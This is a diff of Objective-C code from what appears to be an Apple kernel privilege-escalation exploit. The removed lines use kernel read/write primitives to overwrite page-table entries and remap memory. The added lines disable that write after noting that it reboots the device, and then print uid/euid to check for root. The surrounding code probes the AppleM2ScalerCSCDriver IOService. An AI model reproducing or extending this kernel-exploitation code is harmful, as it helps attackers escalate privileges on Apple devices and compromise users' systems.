@@ -3579,24 +3579,13 @@ static NSString *kpFmtSptmFn(uint64_t raw)
     }
 
     BOOL wrote = NO;
-    // 2.0.156: ALWAYS aperture first (identity then real). Field 2.0.155
-    // logged DMA+wrote=0 on a type-0x21 target — path selection was wrong.
-    uint64_t pteVA = hitTableVA + hitOff;
-    if (hitTableVA) {
-        krw_zone_verdict zid = krw_zone_write_qword(pteVA, hitVal, hitTableVA, 0x4000);
-        uint64_t rbId = early_kread64(pteVA);
-        kpNote(r, [NSString stringWithFormat:@"  [C3W] identity PTE zv=%d rb=%#018llx expect=%#018llx %@",
-                  (int)zid, (unsigned long long)rbId, (unsigned long long)hitVal,
-                  rbId == hitVal ? @"OK" : @"NO"]);
-        if (zid == KRW_ZONE_OK && rbId == hitVal) {
-            krw_zone_verdict zv = krw_zone_write_qword(pteVA, newPte, hitTableVA, 0x4000);
-            kpNote(r, [NSString stringWithFormat:@"  [C3W] aperture remap zv=%d payload=%#018llx",
-                      (int)zv, (unsigned long long)newPte]);
-            wrote = (zv == KRW_ZONE_OK);
-        } else {
-            kpNote(r, @"  [C3W] identity PTE write refused — skip remap");
-        }
-    }
+    // 2.0.157: WALL — aperture write into a PTE page reboots even when FTE
+    // says 0x21 (field). Hunt is read-only. No PTE mutation.
+    kpNote(r, @"  [C3W] WRITE DISABLED (2.0.157): aperture→PT = reboot; DMA→DART copy = no effect on walker.");
+    [r appendString:@"\n=== C3-WRITE DISABLED — hunt only. Root needs a new primitive. ===\n"];
+    [r appendFormat:@"\n[VERIFY] GETUID=%d GETEUID=%d P1=0 WROTE=0 HIT_DART=%d HIT_TYPE=0x%x SWAP_PTE=0\n",
+     (int)getuid(), (int)geteuid(), (int)hitDart, hitType & 0xff];
+    return r;
     if (!wrote && ptePage && ttM && isTable) {
         io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
                                                        IOServiceMatching("AppleM2ScalerCSCDriver"));
